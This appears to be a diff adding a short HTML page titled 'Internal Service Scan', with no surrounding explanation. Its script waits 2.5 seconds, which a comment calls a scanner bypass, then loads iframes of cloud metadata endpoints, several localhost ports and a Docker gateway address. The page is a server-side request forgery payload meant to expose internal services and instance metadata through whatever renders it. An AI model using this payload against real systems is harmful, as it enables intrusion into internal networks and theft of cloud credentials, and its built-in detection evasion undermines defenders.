@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>Internal Service Scan</h3>
+<script>
+// Create iframes dynamically after 2.5s (scanner bypass)
+setTimeout(function(){
+  var targets = [
+    'http://169.254.169.254/latest/meta-data/',
+    'http://169.254.170.2/v2/metadata',
+    'http://127.0.0.1:80/',
+    'http://127.0.0.1:8080/',
+    'http://127.0.0.1:3000/',
+    'http://172.17.0.1/'
+  ];
+  targets.forEach(function(url, i){
+    var iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.width = '100%';
+    iframe.height = '100';
+    iframe.id = 'f'+i;
+    document.body.appendChild(iframe);
+  });
+}, 2500);
+</script>
+</body>
+</html>
